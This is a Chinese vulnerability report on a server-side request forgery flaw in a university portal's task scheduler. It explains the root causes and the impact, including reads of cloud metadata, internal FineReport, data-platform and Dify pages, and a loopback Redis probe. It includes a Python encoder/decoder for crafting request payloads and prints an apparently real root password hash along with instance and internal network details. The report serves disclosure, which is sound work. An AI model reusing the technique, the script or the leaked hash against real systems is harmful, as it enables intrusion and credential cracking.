
# one.xxx.edu.cn（一网通办门户）调度中心任务执行接口存在服务端请求伪造（SSRF），任意在校生可借服务端读取云主机元数据与内网系统响应正文，并取得云主机 root 口令哈希



## 漏洞描述

门户的“调度中心”是一套可配置的 HTTP 任务调度器：每条任务保存目标地址（requestUrl）、请求方法（requestMethod）、Content-Type（requestHeard）、参数表（dispatchCenterParamList：参数名/参数值/参数类型）、执行周期（cron）以及连接与访问超时。平台到点后由门户服务端（OkHttp）向该地址发起请求，并把响应交给 fastjson 解析、按 resultStatus / resultStatusValue 校验业务状态。存量 32 条任务全部指向平台自身接口（工资查询同步、成绩统计、IM 同步、报表生成等），说明该组件是生产调度中枢。


根因有三处：

- 目标地址零约束：requestUrl 允许任意 http/https 地址，既无域名白名单，也不在解析后校验 IP，没有内网、环回、链路本地黑名单。同一平台的链接校验接口（baseService/checkURL）把 127/8、localhost、IPv6 映射等 12 种变体全部拦住，而调度中心一条都不拦。

- 失败即回显正文：DispatchCenterManageServiceImpl.requestMethod() 把目标响应正文（result）、HTTP 状态码（code）、状态行（message）拼进 DevServiceException，handExecute 再把异常原文放进返回体的 msg 字段。

- 无功能级鉴权：submit / handExecute / remove / 日志查询只受网关令牌约束，不校验角色。role_id=1002 的在校生令牌可直接新建任务、立即执行、删除任务并查询全部执行日志。


攻击者能做的事：

- 读取云主机元数据：/latest/meta-data/ 键清单、instance-id（i-000002d7）、instance-type（centos7.5_8c16g200g）、security-groups（default）、placement/availability-zone（az1.dc1）。

- 读取 cloud-init user-data 全文，其中包含云主机 root 口令哈希（$6$ 开头的 SHA-512 crypt）。

- 读取内网系统响应正文：FineReport 报表平台部署页整页 HTML、数据中台首页 HTML、Dify 的 setup 接口 JSON。

- 把方法切成 POST、指定 Content-Type 与请求参数，向内网发起带体的请求。

- 打门户宿主机环回：127.0.0.1:6379 返回 Redis 协议回包（-ERR wrong number of arguments for 'get' command），说明本机 Redis 同机暴露且环回未被拦。

- 把任务设为定时（cron）持续调用，或从 87 万行执行日志中批量取回历史响应正文。

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""SpringBlade / Saber 包装编解码：10 位明文长度(左补零) + Base64(明文)，且每 100 字符插 1 位随机数字

用法:

  python SSRFdata字段解密文件.py 0000000030e7yJpc1ZhbGlkIjp0cnVlLCJlcnJvck1zZyI6IiJ9

  python SSRFdata字段解密文件.py --json '{"msg":"操作成功","result":"0000...","status":1000}'

  python SSRFdata字段解密文件.py --file resp.txt      # 或  type resp.txt | python ... -

  python SSRFdata字段解密文件.py -e '{"url":"http://10.48.30.124/"}'

解密三步: 前 10 位 = 明文长度 L -> 插入位数 n = L//100+1 -> 剔除下标 1,101,201... 后 Base64 解码

（插入的随机数字无需知道是几，按位置剔掉即可；每次响应那一位都不同，属正常现象）

字段解密代码：

"""



import base64
import json
import random
import re
import sys

STEP = 100

def decrypt(cipher: str) -> str:

    """密文 -> 明文（字符串，不保证是 JSON）"""

    cipher = "".join(cipher.split()).lstrip("\ufeff")            # 容忍换行/空格/BOM

    length, body = int(cipher[:10]), cipher[10:]                 # 前 10 位 = 明文长度

    drop = {STEP * a + 1 for a in range(length // STEP + 1)}      # 插入位: 1, 101, 201 ...

    raw = base64.b64decode("".join(c for i, c in enumerate(body) if i not in drop))

    text = raw.decode()

    if length not in (len(raw), len(text)):                      # 长度自检: 抓漏抄/截断

        raise ValueError(f"长度不符: 头部声明 {length}, 实解 {len(raw)} 字节")

    return text

def encrypt(obj) -> str:

    """明文（dict 或 str）-> 密文，可直接粘进 {"data":"..."}"""

    plain = obj if isinstance(obj, str) else json.dumps(

        obj, ensure_ascii=False, separators=(",", ":"))

    raw = plain.encode()

    arr = list(base64.b64encode(raw).decode())

    for a in range(len(raw) // STEP + 1):

        arr.insert(STEP * a + 1, str(random.randint(0, 9)))

    return f"{len(raw):010d}" + "".join(arr)

def extract(text: str) -> str:

    """从整段响应/请求里取 result/data 字段；否则用正则从噪音文本中捞密文"""

    try:

        obj = json.loads(text.lstrip("\ufeff"))

        for key in ("result", "data"):

            if isinstance(obj.get(key), str):

                return obj[key]

    except (json.JSONDecodeError, AttributeError):

        pass

    m = re.search(r"\d{10}[A-Za-z0-9+/=]{8,}", "".join(text.split()))

    return m.group(0) if m else text.strip()

def main(argv: list[str]) -> int:

    args = argv[1:]

    if not args:

        print(__doc__)

        return 2

    if args[0] in ("-e", "--enc"):

        print(encrypt(args[1]))

        return 0

    if args[0] == "--file":

        text = open(args[1], encoding="utf-8-sig").read()

    elif args[0] == "-":

        text = sys.stdin.read()

    elif args[0] == "--json":

        text = args[1]

    else:

        text = " ".join(args)                                    # 允许密文带换行粘贴

    try:

        plain = decrypt(extract(text))

    except Exception as exc:                                       # 输入不完整/抄错时给一句人话

        print(f"解码失败（检查密文是否完整、是否漏抄长度前缀）: {type(exc).__name__}: {exc}",

              file=sys.stderr)
        return 1
    try:
        print(json.dumps(json.loads(plain), ensure_ascii=False, indent=2))
    except json.JSONDecodeError:
        print(plain)                                             
        # 明文非 JSON 就原样输出
    return 0



if __name__ == "__main__":
    sys.exit(main(sys.argv))

```

## 漏洞危害

以下每条均已在授权范围内实测复现：
- 云主机元数据完整可读：/latest/meta-data/ 键清单（ami-id…security-groups），instance-id=i-000002d7，instance-type=centos7.5_8c16g200g，security-groups=default，placement/availability-zone=az1.dc1。

- cloud-init user-data 明文可读，其中直接给出云主机 root 口令哈希：root:$6$5Xfp1r$XfHUz50rBLeuFMKqyMgPgyybgfEAsiKJkKnn1j3Lj184XN3HfNWkGGzJ8r0Z0q5qXCZjKGbS9yJkYq.9.8ylv0。

- 内网三台核心系统响应正文可读：FineReport 报表平台（10.30.xx.164:80）整页 HTML、数据中台（10.48.xx.106:80）首页 HTML、Dify AI 平台（10.48.xx.124:80）setup 接口 JSON（setup_at=2025-03-06T13:49:52）。

- 内网电子图书镜像站（10.30.xx.24:8088）首页整页 HTML 可读，该地址此前仅能从公网图书站友情链接中间接获得。

- 门户宿主机 127.0.0.1 未被拦截：6379 端口返回 Redis 协议回包，说明本机 Redis 与 Web 同机暴露；另有 12 个端口经同一通道判定为关闭，可作为端口级探测原语。

- 请求方法、Content-Type、参数名/值/类型、连接与访问超时均可由攻击者指定，可向内网发起带体 POST。

- 任务可设 cron 定时执行，等价于在门户服务端植入一个可持续调用的内网探测/回调通道。

- 执行日志表共 879,697 行，日志接口对任意登录用户开放且返回每条记录的响应正文——历史上任何一次调度调用的内网响应都可被批量取回。
